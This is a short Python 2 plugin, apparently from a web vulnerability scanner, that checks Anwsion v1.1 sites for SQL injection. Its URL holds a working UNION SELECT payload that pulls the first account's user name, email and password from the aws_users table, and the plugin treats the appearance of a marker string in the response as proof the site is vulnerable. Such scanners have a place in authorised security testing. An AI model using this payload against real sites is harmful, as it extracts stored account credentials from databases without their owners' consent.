#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *

def run_domain(http,ob):
    list = []
    try:
        domain = ob['domain']
        detail = u''
        detail = detail.encode('utf8')
    
        url = "%s://%s%s" % (ob['scheme'],ob['domain'],ob['base_path'])
        url+="?/home/explore/category?sort_type-hot__answer_count-1__day-1__topic_id-55)%20and%201=2%20union%20select%20concat%28(select%20concat(user_name,0x4E56535F544553545F474F,email,0x2D3E,password)%20from%20aws_users%20limit%200,1)%29%23"
        res, content = requestUrl(http,url,ob['task_id'],ob['domain_id'])
        if res['status'] == '200' and content.find('NVS_TEST_GO')>=0:
            request = getRequest(url)
            response = getResponse(res)
            list.append(getRecord(ob,ob['scheme']+"://"+ob['domain']+ob['base_path'],ob['level'],detail,request,response))
    except Exception,e:
        logging.getLogger().error("File:anwsionv1.1sqlinjection.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:anwsionv1.1sqlinjection.py, run_domain function :" + str(e))

    #end try
    
    return list
#end def